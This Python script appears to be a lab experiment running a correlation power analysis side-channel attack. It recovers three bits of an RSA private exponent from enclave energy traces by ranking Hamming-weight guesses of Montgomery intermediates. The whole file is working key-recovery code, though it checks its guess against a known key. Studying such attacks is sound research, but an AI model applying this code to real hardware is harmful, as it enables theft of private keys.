import pandas as pd
import numpy as np
from scipy.stats import pearsonr
import re
import os

# --- 1. RSA PARAMETERS ---
def get_params(filename):
    with open(filename, 'r') as f:
        content = f.read()
    def extract(var):
        match = re.search(rf"rsa_{var}\[\] = \{{ (.*?) \}};", content, re.DOTALL)
        hex_vals = match.group(1).replace("0x", "").replace(",", "").replace(" ", "").replace("\n", "")
        return int(hex_vals, 16)
    n = extract('n')
    d = extract('d')
    d_bin = bin(d)[2:]
    return n, d_bin[6:9] # Modulus and the REAL bits for Window 3

# CONFIGURATION
N, REAL_BITS_W3 = get_params('key.h')
KNOWN_PREFIX = "100011" # Bits 1-6 recovered from previous attacks

# --- 2. LEAKAGE MODEL ---
def get_hw(n):
    return bin(n).count('1')

def model_window_3(msg_hex, guess_int, modulus):
    # Match Enclave math: (Message ^ (Prefix + Guess)) mod N
    msg_int = int(msg_hex, 16)
    R = pow(2, 512, modulus) # Montgomery constant for 512-bit key
    
    # Construct the 9-bit exponent hypothesis
    full_guess_str = KNOWN_PREFIX + format(guess_int, '03b')
    full_guess_int = int(full_guess_str, 2)
    
    # Calculate intermediate state X
    res_standard = pow(msg_int, full_guess_int, modulus)
    
    # Convert to Montgomery form (the internal register state)
    res_mont = (res_standard * R) % modulus
    return get_hw(res_mont)

# --- 3. DATA LOADING ---
# Find the single latest run
data_dirs = sorted([d for d in os.listdir('data') if d.startswith('exp3_')])
if not data_dirs:
    print("No data found in data/ directory.")
    exit()

latest_dir = data_dirs[-1]
df = pd.read_csv(os.path.join('data', latest_dir, 'correlation.csv'))

print(f"[+] Attacking Window 3 using latest run: {latest_dir}")
print(f"[+] Traces: {len(df)} | Known Prefix: {KNOWN_PREFIX}")

# 3-Sigma Outlier Filter
mean_e = df['energy_uj'].mean()
std_e = df['energy_uj'].std()
df = df[(df['energy_uj'] > mean_e - 3*std_e) & (df['energy_uj'] < mean_e + 3*std_e)]

# --- 4. CORRELATION LOOP ---
results = []
for guess in range(8):
    guess_str = format(guess, '03b')
    
    # Calculate hypothetical Hamming Weights for this 3-bit guess
    hws = df['msg_hex'].apply(lambda x: model_window_3(x, guess, N))
    
    # Pearson Correlation
    r, p = pearsonr(hws, df['energy_uj'])
    results.append({'guess': guess_str, 'r': r, 'abs_r': abs(r), 'p': p})

# --- 5. RESULTS & WINNER SELECTION ---
# Rule: Highest |r| where r < 0 (Negative Leakage)
neg_results = [res for res in results if res['r'] < 0]
sorted_all = sorted(results, key=lambda x: x['abs_r'], reverse=True)

print("\n--- Correlation Results (Ranked by |r|) ---")
for i, res in enumerate(sorted_all):
    mark = "*" if res['r'] < 0 else " "
    print(f"  {i+1}. {mark} Guess {res['guess']} | r = {res['r']:+.6f} | |r| = {res['abs_r']:.6f} | p = {res['p']:.2e}")

if not neg_results:
    winner = sorted_all[0]
else:
    winner = max(neg_results, key=lambda x: x['abs_r'])

print("\n================= WINDOW 3 ATTACK REPORT =================")
print(f"Attacker's Best Guess: {winner['guess']} (r={winner['r']:.6f})")
print(f"Actual Key Bits:       {REAL_BITS_W3}")
print("----------------------------------------------------------")

if winner['guess'] == REAL_BITS_W3:
    print("RESULT: SUCCESS! Window 3 recovered.")
else:
    # Find rank of correct bits
    rank = [r['guess'] for r in sorted_all].index(REAL_BITS_W3) + 1
    print(f"RESULT: FAILURE. Correct bits ranked #{rank}")
print("==========================================================")